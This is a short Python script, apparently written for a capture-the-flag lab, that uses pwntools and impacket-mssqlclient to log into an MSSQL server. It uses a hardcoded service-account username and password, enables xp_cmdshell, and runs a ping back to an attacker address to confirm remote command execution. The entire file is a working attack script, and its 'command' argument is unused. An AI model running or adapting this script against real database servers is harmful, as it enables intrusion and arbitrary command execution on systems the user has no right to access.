import pwn
import os

def mssql_rce(username, password, ip, command):
    p = pwn.process(["/usr/bin/impacket-mssqlclient", "-windows-auth", f"{username}:{password}@{ip}"], stdin=pwn.PTY)
    print(p.readuntil(")>"))
    p.write(b"enable_xp_cmdshell\n")
    p.send(b'\4')
    print(p.readuntil("install."))
    print(p.readuntil("install."))
    p.write("xp_cmdshell ping 10.10.14.10\n")
    p.send(b'\4')
    print(p.readuntil("output"))

if __name__=="__main__":
    username = "mssql-svc"
    password = "corporate568"
    ip = "10.10.10.125"
    command = "ping 10.10.14.10"
    mssql_rce(username, password, ip, command)
